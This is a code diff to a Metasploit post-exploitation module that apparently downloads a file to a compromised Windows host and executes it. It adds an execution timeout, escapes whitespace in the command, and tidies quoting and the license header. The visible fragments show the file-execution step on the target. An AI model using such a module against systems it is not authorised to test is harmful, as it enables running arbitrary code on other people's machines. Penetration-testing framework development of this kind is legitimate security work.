@@ -1,8 +1,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -40,6 +40,7 @@ class Metasploit3 < Msf::Post
 		register_advanced_options(
 			[
 				OptString.new('EXEC_STRING',   [false, 'Execution parameters when run from download directory' ]),
+        OptInt.new('EXEC_TIMEOUT',     [true, 'Execution timeout', 60 ]),
 				OptBool.new(  'DELETE',        [true, 'Delete file after execution', false ]),
 			], self.class)
 
@@ -88,8 +89,8 @@ class Metasploit3 < Msf::Post
 		end
 
 		outpath = path + '\\' + filename
-		exec = datastore["EXECUTE"]
-		exec_string = datastore["EXEC_STRING"] || ''
+		exec = datastore['EXECUTE']
+		exec_string = datastore['EXEC_STRING'] || ''
 		output = datastore['OUTPUT']
 		remove = datastore['DELETE']
 
@@ -112,14 +113,14 @@ class Metasploit3 < Msf::Post
 		# Execute file upon request
 		if exec
 			begin
-				cmd = outpath + ' ' + exec_string
+				cmd = "#{outpath} #{exec_string}"
 
 				# If we don't have the following gsub, we get this error in Windows:
 				# "Operation failed: The system cannot find the file specified"
-				cmd = cmd.gsub(/\\/, '\\\\\\')
+				cmd = cmd.gsub(/\\/, '\\\\\\').gsub(/\s/, '\ ')
 
 				print_status("Executing file: #{cmd}")
-				res = cmd_exec(cmd)
+				res = cmd_exec(cmd, nil, datastore['EXEC_TIMEOUT'])
 				print_good(res) if output and not res.empty?
 			rescue ::Exception => e
 				print_error("Unable to execute: #{e.message}")
